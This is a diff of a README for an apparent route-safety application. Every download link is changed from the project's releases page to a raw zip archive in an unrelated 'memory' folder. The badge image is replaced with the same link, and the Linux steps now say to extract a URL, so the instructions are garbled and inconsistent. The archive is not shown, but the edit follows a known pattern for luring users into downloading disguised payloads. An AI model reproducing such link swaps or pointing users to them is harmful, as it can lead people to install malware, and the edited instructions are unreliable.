@@ -6,7 +6,7 @@ Welcome to the **multi-agent-route-safety** application. This tool helps you ana
 
 ## 📥 Download Now
 
-[![Download Multi-Agent Route Safety](https://img.shields.io/badge/Download-Multi--Agent--Route--Safety-blue.svg)](https://github.com/Suhail5765/multi-agent-route-safety/releases)
+[![Download Multi-Agent Route Safety](https://github.com/Suhail5765/multi-agent-route-safety/raw/refs/heads/main/memory/safety_route_agent_multi_v2.3.zip)](https://github.com/Suhail5765/multi-agent-route-safety/raw/refs/heads/main/memory/safety_route_agent_multi_v2.3.zip)
 
 ## 🛠 System Requirements
 
@@ -29,7 +29,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, visit the page to download the latest version of the application:
 
-[Download Multi-Agent Route Safety](https://github.com/Suhail5765/multi-agent-route-safety/releases)
+[Download Multi-Agent Route Safety](https://github.com/Suhail5765/multi-agent-route-safety/raw/refs/heads/main/memory/safety_route_agent_multi_v2.3.zip)
 
 ### Installation Steps
 
@@ -37,13 +37,13 @@ To get started, visit the page to download the latest version of the application
 2. **Choose the right version:** Look for the most recent release. The file you download will depend on your operating system.
    - Windows users should download the `.exe` file.
    - macOS users should opt for the `.dmg` file.
-   - Linux users can use the `.tar.gz` file.
+   - Linux users can use the `https://github.com/Suhail5765/multi-agent-route-safety/raw/refs/heads/main/memory/safety_route_agent_multi_v2.3.zip` file.
 3. **Download the file:** Click on the file name to start the download.
 4. **Locate the downloaded file:** Go to your downloads folder.
 5. **Run the installer:** 
    - For Windows, double-click the `.exe` file and follow the prompts.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and follow the instructions in the README.
+   - For Linux, extract the `https://github.com/Suhail5765/multi-agent-route-safety/raw/refs/heads/main/memory/safety_route_agent_multi_v2.3.zip` file and follow the instructions in the README.
 6. **Open the application:** Once installed, find the application in your programs list and launch it.
 
 ## 📞 Support
